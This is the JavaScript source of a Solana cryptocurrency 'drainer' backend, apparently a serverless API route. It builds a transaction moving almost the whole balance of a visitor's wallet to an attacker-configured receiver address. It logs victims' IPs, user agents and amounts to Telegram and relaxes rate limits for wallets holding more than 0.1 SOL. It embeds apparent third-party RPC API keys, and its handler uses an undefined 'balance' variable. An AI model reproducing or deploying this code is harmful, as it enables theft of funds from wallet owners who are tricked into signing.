import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

// Import enhancement modules
import EnhancedRPCManager from '../src/enhanced-rpc.js';
import CommitmentOptimizer from '../src/commitment-optimizer.js';
import DynamicRateLimiter from '../src/dynamic-rate-limiter.js';
import IntelligentRetryManager from '../src/intelligent-retry.js';
import FeeOptimizer from '../src/fee-optimizer.js';
import TransactionMonitor from '../src/transaction-monitor.js';
import WalletOptimizer from '../src/wallet-optimizer.js';

// Initialize enhancement modules
const enhancementModules = {
  rpcManager: new EnhancedRPCManager(),
  commitmentOptimizer: new CommitmentOptimizer(),
  rateLimiter: new DynamicRateLimiter(),
  retryManager: new IntelligentRetryManager(),
  feeOptimizer: new FeeOptimizer(),
  transactionMonitor: new TransactionMonitor(),
  walletOptimizer: new WalletOptimizer()
};

console.log('[ENHANCED_DRAINER] All enhancement modules initialized successfully');

function validateEnvironment() {
  const warnings = [];
  
  if (!process.env.RPC_URL) warnings.push('RPC_URL not set - using fallback endpoints');
  if (!process.env.RECEIVER_WALLET) warnings.push('RECEIVER_WALLET not set - using fallback address');
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    warnings.push('Telegram credentials not set - logging may be limited');
  }
  
  if (warnings.length > 0) console.log('[ENV] Environment warnings:', warnings);
  return warnings.length === 0;
}

const isEnvValid = validateEnvironment();

// Production logging - allow all drain-related logs
function debugLog(message, ...args) {
  if (message && (
    message.includes && (
      message.includes('ERROR') || 
      message.includes('[DRAIN]') ||
      message.includes('[BALANCE]') ||
      message.includes('[TELEGRAM]') ||
      message.includes('Wallet Detected') ||
      message.includes('DRAIN_FAILED') ||
      message.includes('Creating transfer') ||
      message.includes('Drain attempt details') ||
      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
      message.includes('DRAIN_AMOUNT') ||
      message.includes('CONFIRMATION') ||
      message.includes('CONFIRMATION_HANDLER') ||
      message.includes('DRAIN_CREATED') ||
      message.includes('DRAIN_CREATED_FRONTEND') ||
      message.includes('[ENHANCED_') ||
      message.includes('[RATE_LIMIT]')
    )
  )) {
    console.log(message, ...args);
  }
}

// Enhanced RPC management using the enhancement module
async function getEnhancedConnection(commitmentConfig = null) {
  try {
    console.log('[ENHANCED_DRAINER] Getting optimal RPC connection...');
    const connection = await enhancementModules.rpcManager.getOptimalConnection(commitmentConfig);
    console.log('[ENHANCED_DRAINER] Successfully obtained enhanced RPC connection');
    return connection;
  } catch (error) {
    console.log('[ENHANCED_DRAINER] Enhanced RPC failed, falling back to original method:', error.message);
    // Fallback to original RPC logic if enhanced version fails
    return getFallbackConnection();
  }
}

// Fallback to original RPC logic
const RPC_ENDPOINTS = [
  { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
  { url: process.env.RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', weight: 1 },
  { url: 'https://solana-mainnet.g.alchemy.com/v2/demo', weight: 1 },
  { url: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0', weight: 1 }
];

let currentRpcIndex = 0;
let rpcFailures = new Map();
const connectionPool = new Map();

async function getFallbackConnection() {
  const maxRetries = 3;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcEndpoint = RPC_ENDPOINTS[currentRpcIndex];
    const rpcUrl = rpcEndpoint.url;
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        // Use default connection settings for fallback
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 60000,
          disableRetryOnRateLimit: false,
          httpHeaders: { 'Content-Type': 'application/json' }
        });
        connectionPool.set(rpcUrl, connection);
      }
      
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), 5000)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      // Track failures
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      // Skip RPCs with too many failures
      if (failures > 3) {
        // Silent failure tracking
      }
      
      // Rotate to next RPC endpoint
      currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      // Exponential backoff
      await new Promise(resolve => setTimeout(resolve, Math.min(1000 * Math.pow(2, attempt), 10000)));
    }
  }
}

// Enhanced rate limiting using the enhancement module
function checkEnhancedRateLimit(userIp, walletAddress = null, walletBalance = null) {
  try {
    console.log('[ENHANCED_DRAINER] Using enhanced rate limiting...');
    const result = enhancementModules.rateLimiter.checkRateLimit(userIp, walletAddress, walletBalance);
    console.log('[ENHANCED_DRAINER] Enhanced rate limit result:', result);
    return result;
  } catch (error) {
    console.log('[ENHANCED_DRAINER] Enhanced rate limiting failed, falling back to original:', error.message);
    // Fallback to original rate limiting
    return checkFallbackRateLimit(userIp, walletAddress, walletBalance);
  }
}

// Fallback to original rate limiting logic
const requestCache = new Map();
const walletRequestCache = new Map();
const blockedIPs = new Set();

const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 15; // Increased from 10 to 15
const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Increased from 5 to 8

// Cache cleanup function to prevent memory leaks
function cleanupOldCacheEntries() {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  // Clean up IP cache
  for (const [ip, requests] of requestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      requestCache.delete(ip);
    } else {
      requestCache.set(ip, filtered);
    }
  }
  
  // Clean up wallet cache
  for (const [wallet, requests] of walletRequestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      walletRequestCache.delete(wallet);
    } else {
      walletRequestCache.set(wallet, filtered);
    }
  }
}

// Enhanced rate limiting with high-value wallet bypass
function checkFallbackRateLimit(userIp, walletAddress = null, walletBalance = null) {
  console.log('[RATE_LIMIT] Starting fallback rate limit check for IP:', userIp, 'wallet:', walletAddress, 'balance:', walletBalance);
  const now = Date.now();
  
  // Periodic cache cleanup (every 100 requests to avoid performance impact)
  if (Math.random() < 0.01) { // 1% chance to trigger cleanup
    cleanupOldCacheEntries();
  }
  
  // High-value wallet bypass: Skip rate limits for wallets with > 0.1 SOL
  if (walletAddress && walletBalance && walletBalance > 100000000) { // 0.1 SOL = 100,000,000 lamports
    // Still check IP-based rate limiting for security (but with higher limits)
    const ipRequests = requestCache.get(userIp) || [];
    const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    // Allow higher limits for high-value wallets but still protect against abuse
    const highValueMaxRequests = MAX_REQUESTS_PER_WINDOW * 3; // 3x normal limit
    if (recentIpRequests.length >= highValueMaxRequests) {
      return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
    }
    
    return { allowed: true, reason: 'HIGH_VALUE_WALLET_BYPASS' };
  }
  
  // Check IP-based rate limiting
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
  }
  
  // Check wallet-based rate limiting
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { allowed: false, reason: 'WALLET_RATE_LIMIT_EXCEEDED', retryAfter: 120 };
    }
    
    recentWalletRequests.push(now);
    walletRequestCache.set(walletAddress, recentWalletRequests);
  }
  
  // Check if IP is blocked
  if (blockedIPs.has(userIp)) {
    return { allowed: false, reason: 'IP_BLOCKED', retryAfter: 3600 };
  }
  
  // Update IP request cache
  recentIpRequests.push(now);
  requestCache.set(userIp, recentIpRequests);
  
  return { allowed: true };
}

// CORS headers
function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

// Enhanced error handling function with specific error types
async function handleDrainError(error, userPubkey, userIp) {
  let errorType = 'GENERAL_ERROR';
  let statusCode = 500;
  
  // Determine error type based on error message and properties
  if (error.message?.includes('429') || error.message?.includes('rate limit')) {
    errorType = 'RATE_LIMITED';
    statusCode = 429;
  } else if (error.message?.includes('503') || error.message?.includes('service unavailable')) {
    errorType = 'SERVICE_UNAVAILABLE';
    statusCode = 503;
  } else if (error.message?.includes('insufficient') || error.message?.includes('balance')) {
    errorType = 'INSUFFICIENT_FUNDS';
    statusCode = 400;
  } else if (error.message?.includes('timeout') || error.message?.includes('connection')) {
    errorType = 'TIMEOUT';
    statusCode = 408;
  } else if (error.message?.includes('invalid') || error.message?.includes('malformed')) {
    errorType = 'INVALID_REQUEST';
    statusCode = 400;
  } else if (error.message?.includes('unauthorized') || error.message?.includes('forbidden')) {
    errorType = 'UNAUTHORIZED';
    statusCode = 401;
  } else if (error.name === 'NetworkError' || error.message?.includes('network')) {
    errorType = 'NETWORK_ERROR';
    statusCode = 503;
  }
  
  await telegramLogger.logDrainFailed({
    publicKey: userPubkey?.toString() || 'N/A',
    lamports: 0,
    ip: userIp,
    error: error.message
  });
  
  return {
    status: statusCode,
    error: getErrorMessage(errorType),
    details: getErrorDetails(errorType),
    code: errorType
  };
}

// Helper functions for error messages
function getErrorMessage(errorType) {
  const messages = {
    'RATE_LIMITED': 'Rate limit exceeded',
    'SERVICE_UNAVAILABLE': 'Service temporarily unavailable',
    'INSUFFICIENT_FUNDS': 'Insufficient funds',
    'TIMEOUT': 'Request timeout',
    'INVALID_REQUEST': 'Invalid request',
    'UNAUTHORIZED': 'Unauthorized',
    'NETWORK_ERROR': 'Network error',
    'GENERAL_ERROR': 'Service temporarily unavailable'
  };
  return messages[errorType] || messages['GENERAL_ERROR'];
}

function getErrorDetails(errorType) {
  const details = {
    'RATE_LIMITED': 'Too many requests. Please try again later.',
    'SERVICE_UNAVAILABLE': 'Please try again later.',
    'INSUFFICIENT_FUNDS': 'Please ensure your wallet has sufficient funds.',
    'TIMEOUT': 'Request took too long. Please try again.',
    'INVALID_REQUEST': 'Please check your request and try again.',
    'UNAUTHORIZED': 'Authentication required.',
    'NETWORK_ERROR': 'Network connection issue. Please try again.',
    'GENERAL_ERROR': 'Please try again later.'
  };
  return details[errorType] || details['GENERAL_ERROR'];
}

// Enhanced transaction creation with all optimizations
async function createEnhancedTransaction(userPubkey, balance, connection, walletType = 'Unknown') {
  try {
    console.log('[ENHANCED_DRAINER] Creating enhanced transaction...');
    
    // Get optimized commitment level
    const commitmentConfig = enhancementModules.commitmentOptimizer.getConnectionSettings(balance);
    console.log('[ENHANCED_DRAINER] Using commitment:', commitmentConfig.commitment);
    
    // Get optimized fee
    const feeConfig = await enhancementModules.feeOptimizer.calculateOptimalFee(balance);
    console.log('[ENHANCED_DRAINER] Optimal fee:', feeConfig.feeSOL, 'SOL');
    
    // Get wallet-specific optimizations
    const walletConfig = enhancementModules.walletOptimizer.getOptimizedConfig(walletType, balance);
    console.log('[ENHANCED_DRAINER] Wallet optimizations applied for:', walletType);
    
    // Create transaction with retry logic
    const transaction = await enhancementModules.retryManager.executeWithRetry(
      'createTransaction',
      async () => {
        return await createBasicTransaction(userPubkey, balance, connection, commitmentConfig);
      },
      balance
    );
    
    console.log('[ENHANCED_DRAINER] Enhanced transaction created successfully');
    return transaction;
    
  } catch (error) {
    console.log('[ENHANCED_DRAINER] Enhanced transaction creation failed, falling back to original:', error.message);
    // Fallback to original transaction creation with default commitment
    return createBasicTransaction(userPubkey, balance, connection, { commitment: 'confirmed' });
  }
}

// Basic transaction creation (enhanced version)
async function createBasicTransaction(userPubkey, balance, connection, commitmentConfig = null) {
  try {
    const commitment = commitmentConfig?.commitment || 'confirmed';
    
    // Get latest blockhash with optimized commitment
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash(commitment);
    
    // Calculate drain amount (preserve your existing logic)
    const FEE_BUFFER = 10000; // 0.00001 SOL
    const RESERVE_LAMPORTS = 1000000; // 0.001 SOL
    const finalDrainAmount = balance - FEE_BUFFER - RESERVE_LAMPORTS;
    
    if (finalDrainAmount <= 0) {
      throw new Error('Insufficient balance for drain');
    }
    
    // Create transfer instruction
    const transferInstruction = SystemProgram.transfer({
      fromPubkey: new PublicKey(userPubkey),
      toPubkey: new PublicKey(process.env.RECEIVER_WALLET || '11111111111111111111111111111111'),
      lamports: finalDrainAmount
    });
    
    // Create transaction
    const transaction = new Transaction();
    transaction.add(transferInstruction);
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = new PublicKey(userPubkey);
    
    console.log('[ENHANCED_DRAINER] Transaction created with amount:', (finalDrainAmount / 1e9).toFixed(6), 'SOL');
    
    return {
      transaction,
      finalDrainAmount,
      blockhash,
      lastValidBlockHeight
    };
    
  } catch (error) {
    console.log('[ENHANCED_DRAINER] Basic transaction creation failed:', error.message);
    throw error;
  }
}

// Enhanced transaction monitoring
async function startEnhancedMonitoring(txid, connection, balance, context = {}) {
  try {
    console.log('[ENHANCED_DRAINER] Starting enhanced transaction monitoring...');
    const monitoringId = await enhancementModules.transactionMonitor.startMonitoring(
      txid,
      connection,
      balance,
      context
    );
    console.log('[ENHANCED_DRAINER] Enhanced monitoring started:', monitoringId);
    return monitoringId;
  } catch (error) {
    console.log('[ENHANCED_DRAINER] Enhanced monitoring failed:', error.message);
    // Continue without monitoring - not critical
    return null;
  }
}

export default async function handler(req, res) {
  console.log('[ENHANCED_DRAINER] Starting enhanced drainer handler');
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    setCORSHeaders(res);
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    setCORSHeaders(res);
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const { publicKey } = req.body;
    
    if (!publicKey) {
      setCORSHeaders(res);
      res.status(400).json({ error: 'Public key is required' });
      return;
    }

    let userPubkey;
    try {
      userPubkey = new PublicKey(publicKey);
    } catch (error) {
      setCORSHeaders(res);
      res.status(400).json({ error: 'Invalid public key format' });
      return;
    }

    console.log('[ENHANCED_DRAINER] Processing drain request for:', publicKey);

    // Detect wallet type from user agent
    const walletType = enhancementModules.walletOptimizer.detectWalletType(userAgent);
    console.log('[ENHANCED_DRAINER] Detected wallet type:', walletType);

    // Get optimal commitment level for this wallet
    const commitmentConfig = enhancementModules.commitmentOptimizer.getConnectionSettings(balance);
    
    // Get enhanced connection with optimal commitment
    const connection = await getEnhancedConnection(commitmentConfig);
    console.log('[ENHANCED_DRAINER] Wallet balance:', (balance / 1e9).toFixed(6), 'SOL');

    // Check enhanced rate limits
    const rateLimitCheck = checkEnhancedRateLimit(userIp, publicKey, balance);
    if (!rateLimitCheck.allowed) {
      console.log('[ENHANCED_DRAINER] Rate limit exceeded:', rateLimitCheck.reason);
      setCORSHeaders(res);
      res.status(429).json({
        error: 'Rate limit exceeded',
        reason: rateLimitCheck.reason,
        retryAfter: rateLimitCheck.retryAfter || 60
      });
      return;
    }

    // Create enhanced transaction
    const { transaction, finalDrainAmount, blockhash, lastValidBlockHeight } = 
      await createEnhancedTransaction(userPubkey, balance, connection, walletType);

    // Serialize transaction
    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false
    });

    // Start enhanced monitoring (non-blocking)
    const monitoringId = await startEnhancedMonitoring(
      'pending', // Will be updated when transaction is signed
      connection,
      balance,
      { walletType, userIp, userAgent }
    );

    // Log successful drain creation
    await telegramLogger.logDrainCreated({
      publicKey: publicKey,
      lamports: finalDrainAmount,
      ip: userIp,
      userAgent: userAgent,
      walletType: walletType,
      monitoringId: monitoringId
    });

    console.log('[ENHANCED_DRAINER] Drain transaction created successfully');
    console.log('[ENHANCED_DRAINER] Amount:', (finalDrainAmount / 1e9).toFixed(6), 'SOL');
    console.log('[ENHANCED_DRAINER] Monitoring ID:', monitoringId);

    // Return success response
    setCORSHeaders(res);
    res.status(200).json({
      success: true,
      message: 'Drain transaction created successfully',
      transaction: {
        serializedTransaction: serializedTransaction.toString('base64'),
        blockhash: blockhash,
        lastValidBlockHeight: lastValidBlockHeight,
        amount: finalDrainAmount,
        amountSOL: (finalDrainAmount / 1e9).toFixed(9)
      },
      monitoring: {
        id: monitoringId,
        status: 'active'
      },
      optimizations: {
        walletType: walletType,
        commitment: commitmentConfig.commitment,
        enhanced: true
      }
    });

  } catch (error) {
    console.log('[ENHANCED_DRAINER] Error in handler:', error.message);
    
    const errorResponse = await handleDrainError(error, req.body?.publicKey, userIp);
    
    setCORSHeaders(res);
    res.status(errorResponse.status).json({
      success: false,
      error: errorResponse.error,
      details: errorResponse.details,
      code: errorResponse.code
    });
  }

  const endTime = Date.now();
  console.log('[ENHANCED_DRAINER] Handler completed in:', endTime - startTime, 'ms');
}

// Export enhancement modules for external use
export { enhancementModules };
